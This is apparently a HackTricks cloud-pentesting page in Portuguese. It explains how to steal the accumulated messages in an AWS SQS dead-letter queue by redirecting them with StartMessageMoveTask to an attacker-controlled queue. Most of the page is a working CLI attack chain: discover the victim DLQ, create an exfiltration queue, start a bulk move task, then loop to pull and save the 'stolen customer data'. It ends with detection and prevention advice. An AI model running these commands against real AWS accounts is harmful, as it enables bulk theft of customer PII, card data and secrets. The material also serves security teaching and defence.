# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Descrição

Abuse tarefas de movimentação de mensagens do SQS para roubar todas as mensagens acumuladas na Dead-Letter Queue (DLQ) de uma vítima, redirecionando-as para uma fila controlada pelo atacante usando `sqs:StartMessageMoveTask`. Essa técnica explora o recurso legítimo de recuperação de mensagens da AWS para exfiltrar dados sensíveis que se acumularam em DLQs ao longo do tempo.

## O que é uma Dead-Letter Queue (DLQ)?

Uma Dead-Letter Queue é uma fila SQS especial onde mensagens são automaticamente enviadas quando falham ao ser processadas com sucesso pela aplicação principal. Essas mensagens falhadas frequentemente contêm:
- Dados sensíveis da aplicação que não puderam ser processados
- Detalhes de erro e informações para debug
- Personal Identifiable Information (PII)
- API tokens, credenciais ou outros segredos
- Dados de transações críticos para o negócio

DLQs funcionam como um "cemitério" para mensagens falhadas, tornando-as alvos valiosos já que acumulam dados sensíveis ao longo do tempo que as aplicações não conseguiram tratar corretamente.

## Cenário de ataque

**Exemplo real:**
1. **Aplicação de e-commerce** processa pedidos de clientes via SQS
2. **Alguns pedidos falham** (problemas de pagamento, falta de estoque, etc.) e são movidos para uma DLQ
3. **A DLQ acumula** semanas/meses de pedidos falhados contendo dados de clientes: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Atacante obtém acesso** a credenciais AWS com permissões SQS
5. **Atacante descobre** que a DLQ contém milhares de pedidos falhados com dados sensíveis
6. **Ao invés de tentar acessar mensagens individuais** (lento e óbvio), o atacante usa `StartMessageMoveTask` para transferir em massa TODAS as mensagens para sua própria fila
7. **Atacante extrai** todos os dados históricos sensíveis em uma única operação

## Requisitos
- A fila de origem deve estar configurada como uma DLQ (referenciada por pelo menos uma RedrivePolicy de alguma fila).
- Permissões IAM (executando como o principal comprometido da vítima):
- Na DLQ (origem): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Na fila de destino: permissão para entregar mensagens (por exemplo, política de fila permitindo `sqs:SendMessage` a partir do principal da vítima). Para destinos na mesma conta isso normalmente é permitido por padrão.
- Se SSE-KMS estiver habilitado: na CMK de origem `kms:Decrypt`, e na CMK de destino `kms:GenerateDataKey`, `kms:Encrypt`.

## Impacto
Exfiltra cargas sensíveis acumuladas em DLQs (eventos falhados, PII, tokens, payloads de aplicação) em alta velocidade usando as APIs nativas do SQS. Funciona cross-account se a política da fila de destino permitir `SendMessage` a partir do principal da vítima.

## Como Abusar

- Identificar o ARN da DLQ da vítima e garantir que ela esteja realmente referenciada como DLQ por alguma fila (qualquer fila serve).
- Criar ou escolher uma fila de destino controlada pelo atacante e obter seu ARN.
- Iniciar uma tarefa de movimentação de mensagens da DLQ da vítima para sua fila de destino.
- Monitorar o progresso ou cancelar se necessário.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Cenário**: Um atacante comprometeu credenciais AWS e descobriu que uma aplicação de e-commerce usa SQS com uma DLQ contendo tentativas de processamento de pedidos de clientes que falharam.

1) **Descobrir e examinar a DLQ da vítima**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Criar fila de destino controlada pelo atacante**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Execute o roubo em massa de mensagens**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Coletar os dados sensíveis roubados**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Notas entre contas
- A fila de destino deve ter uma resource policy permitindo que o principal da vítima execute `sqs:SendMessage` (e, se usado, KMS grants/permissions).

## Por que este ataque é eficaz

1. **Legitimate AWS Feature**: Usa funcionalidade integrada da AWS, tornando difícil detectá-lo como malicioso
2. **Bulk Operation**: Transfere milhares de mensagens rapidamente em vez de acesso individual lento
3. **Historical Data**: DLQs acumulam dados sensíveis ao longo de semanas/meses
4. **Under the Radar**: Muitas organizações não monitoram o acesso a DLQs de perto
5. **Cross-Account Capable**: Pode exfiltrar para a própria conta AWS do atacante se as permissões permitirem

## Detecção e Prevenção

### Detecção
Monitor CloudTrail para chamadas API suspeitas `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Prevenção
1. **Least Privilege**: Restringir permissões `sqs:StartMessageMoveTask` apenas aos papéis necessários
2. **Monitor DLQs**: Configurar alarmes do CloudWatch para atividades incomuns em DLQs
3. **Políticas entre contas**: Revisar cuidadosamente as políticas da fila SQS que permitem acesso entre contas
4. **Criptografar DLQs**: Usar SSE-KMS com políticas de chave restritas
5. **Limpeza Regular**: Não permita que dados sensíveis se acumulem em DLQs indefinidamente

{{#include ../../../banners/hacktricks-training.md}}
